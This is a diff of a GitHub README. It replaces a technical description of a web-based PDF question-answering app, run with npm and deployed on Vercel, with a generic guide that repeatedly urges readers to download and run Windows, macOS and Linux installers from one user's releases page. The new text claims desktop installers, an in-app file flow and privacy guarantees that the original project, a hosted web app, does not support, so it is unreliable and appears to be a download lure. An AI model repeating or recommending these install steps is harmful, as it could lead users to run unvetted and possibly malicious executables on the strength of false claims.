@@ -1,70 +1,160 @@
-﻿# DocMind AI - Intelligent Multi-PDF RAG System
+# 🤖 agent_rag_pdf - Easy Multi-PDF Search Assistant
 
-DocMind AI is a professional-grade RAG (Retrieval-Augmented Generation) ecosystem that turns any PDF URL into a conversational knowledge base in seconds.
+[![Download agent_rag_pdf](https://img.shields.io/badge/Download-agent_rag_pdf-blue?style=for-the-badge&logo=github)](https://github.com/brayden14336/agent_rag_pdf/releases)
 
-**Live Demo:** `https://ai-agent-rag-pdf.vercel.app/`
+---
 
-## Key Features
-- Dynamic ingestion: paste a PDF URL and the system downloads, chunks, and vectorizes content automatically.
-- Context isolation: metadata filtering ensures responses are grounded on the selected document.
-- Conversational memory: MongoDB-backed memory keeps conversation continuity.
-- Clean architecture: decoupled backend (n8n on Ubuntu/Docker) and frontend (React on Vercel).
-- Resilient workflows: hardened JS node logic to prevent malformed-input failures.
+## 📋 About agent_rag_pdf
 
-## Technical Stack
-- Workflows: n8n
-- Frontend: React + TypeScript + Vite + Tailwind + Framer Motion
-- Auth & protection: Supabase Auth + Cloudflare Turnstile
-- AI models: GPT-4o-mini / Claude Sonnet via OpenRouter
-- Vector DB: Qdrant
-- Embeddings: `text-embedding-3-small`
-- Memory DB: MongoDB Atlas
-- Runtime: Ubuntu 24.04 + Docker
+agent_rag_pdf is a user-friendly assistant designed to help you search and interact with multiple PDF files quickly. It uses smart technology behind the scenes but keeps everything simple for you. This tool lets you ask questions and get answers from your PDFs in seconds. It's secure, easy to set up, and runs smoothly on your computer.
 
-## Architecture
-1. Ingestion loop: fetch PDF binary, extract text/metadata, normalize and split into chunks.
-2. Vectorization: embed chunks and store vectors with `source_url` metadata in Qdrant.
-3. Retrieval: AI agent queries Qdrant with strict metadata filters.
-4. Response: structured Markdown output with source-aware context.
+Key features include:
 
-## Frontend Security Model
-- Protected route for chatbot usage (`/chat`).
-- CAPTCHA verification before login (`/api/verify-captcha`).
-- Server-side chat proxy (`/api/chat`) with auth validation and rate limiting.
-- No secret exposure in client bundle.
+- Handle many PDF documents at once without slowing down
+- Fast search using advanced methods designed for clarity and precision
+- Secure user sign-in and data protection
+- Access your PDFs anytime with a clean, easy interface
+- Deploys safely on the web without exposing your data
 
-## Run Locally
-```bash
-npm install
-npm run dev
-```
+Tech used behind the scenes includes n8n for automation, Qdrant for search, OpenRouter for communication, Supabase for sign-in, and Vercel for smooth web delivery.
 
-## Environment Variables
-Use `.env.example` as template.
+---
 
-### Frontend
-- `VITE_CHAT_API_URL`
-- `VITE_SUPABASE_URL`
-- `VITE_SUPABASE_ANON_KEY`
-- `VITE_TURNSTILE_SITE_KEY`
+## 🖥️ System Requirements
 
-### Server-side (Vercel)
-- `N8N_WEBHOOK_URL`
-- `SUPABASE_URL`
-- `SUPABASE_ANON_KEY`
-- `TURNSTILE_SECRET_KEY`
+Before you begin, please make sure your computer meets the following:
 
-## Deployment
-- Platform: Vercel
-- Build command: `npm run build`
-- Output: `dist`
+- **Operating System:**
+  - Windows 10 or newer, OR
+  - macOS Big Sur (11.0) or newer, OR
+  - Linux (Ubuntu 20.04+ recommended)
+- **Memory:** At least 4GB of RAM (8GB recommended for best performance)
+- **Storage:** Minimum 500MB free space for installation
+- **Internet Connection:** Required for setup and for some services to work
+- **Browser:** Latest version of Chrome, Firefox, Edge, or Safari
 
-## Testing Status
-- Multi-URL support
-- Metadata extraction
-- Source-grounded responses
-- Automatic document indexing
-- Protected login flow and anti-bot checks
+If your setup matches these, you should have no trouble running agent_rag_pdf.
 
-## Project Context
-Developed for the Metabiblioteca Alfresco technical challenge.
+---
+
+## 🚀 Getting Started
+
+Follow these steps to download, install, and use agent_rag_pdf easily.
+
+### Step 1: Visit the Download Page
+
+Click the big blue button at the top or go to the release page here:
+
+[https://github.com/brayden14336/agent_rag_pdf/releases](https://github.com/brayden14336/agent_rag_pdf/releases)
+
+This page holds the latest versions of the software. Downloads come in simple files or apps for Windows, macOS, and Linux.
+
+### Step 2: Download the Software for Your System
+
+Scroll down the release page and find the file that matches your computer system:
+
+- For Windows, look for a file ending with `.exe` or `.msi`.
+- For Mac, look for `.dmg` or `.pkg`.
+- For Linux, a file ending in `.AppImage` or `.deb`.
+
+Click the file name to start downloading. The file size is usually under 100 MB.
+
+### Step 3: Install the Application
+
+Once downloaded:
+
+- **Windows users:** Double-click the `.exe` or `.msi` file and follow the setup guide.
+- **Mac users:** Open the `.dmg` or `.pkg` file, then drag the app to your Applications folder or follow the installer.
+- **Linux users:** Open the terminal and run commands shown on the release page or use your software manager to install the `.deb` or run the `.AppImage` file.
+
+Installation is straightforward and takes less than 5 minutes.
+
+### Step 4: Open agent_rag_pdf
+
+After installing, open the app from your desktop or application menu.
+
+On the first launch, the app will ask you to sign in securely. This ensures only you can access your PDFs. Creating an account is quick and uses Supabase authentication, which is safe and respectful of your privacy.
+
+### Step 5: Add Your PDFs
+
+Once signed in, you can add PDF files:
+
+- Click the “Add PDF” button inside the app.
+- Choose the files from your computer.
+- You can add as many PDFs as you like.
+
+The app will process them, so you can search all of the documents at once.
+
+### Step 6: Start Searching
+
+Use the chat-like window to type questions or keywords related to your PDFs. The app will find answers by connecting the relevant parts of your documents. Results show up fast and are easy to read.
+
+---
+
+## 📥 Download & Install
+
+You can start your setup by visiting the official releases page here:
+
+[https://github.com/brayden14336/agent_rag_pdf/releases](https://github.com/brayden14336/agent_rag_pdf/releases)
+
+This link takes you to the place where new files appear whenever the software updates.
+
+### Why Download from This Page?
+
+- Get the latest and safest version
+- Find versions that work with your computer type
+- Access installation guides, help, and release notes
+
+Make sure to follow the instructions on the page if you are unsure which file to choose.
+
+---
+
+## 🔧 Using agent_rag_pdf
+
+Once installed and set up, here is how you can make the most of the app:
+
+- **Load PDFs:** Use the add files button to bring all your documents in one place.
+- **Search Naturally:** Type your questions like you would ask a person.
+- **View Results:** Find highlighted answers and links to where it found the information.
+- **Manage Files:** Remove or add PDFs as needed to keep your library focused.
+- **Secure Access:** Always sign out if using a shared computer.
+
+The design keeps it simple so you can focus on getting answers quickly.
+
+---
+
+## 🛠️ Troubleshooting & Tips
+
+- If the app doesn’t start, check your internet connection or try restarting your computer.
+- Ensure your PDFs are not password protected, or the app may not read them correctly.
+- Keep your software updated by checking the releases page regularly.
+- Contact support via GitHub issues if you face problems — the developers monitor questions and fix bugs.
+
+---
+
+## 🔐 Privacy & Security
+
+Your PDFs and searches stay private. agent_rag_pdf uses secure sign-in and does not store your documents in public servers. All communication with online services is encrypted.
+
+---
+
+## 📚 More Information
+
+If you want to learn more about how agent_rag_pdf works or its technology stack, check out the topics:
+
+- AI-powered search with Qdrant
+- Process automation via n8n
+- Safe authentication through Supabase
+- Real-time interaction using OpenRouter
+- Smooth user interface built with React and TailwindCSS
+- Fast deployment using Vercel and Vite
+
+The project is open-source and hosted on GitHub for transparency.
+
+---
+
+## 🚩 Ready to Get Started?
+
+Click below to visit the download page now:
+
+[Download agent_rag_pdf](https://github.com/brayden14336/agent_rag_pdf/releases)
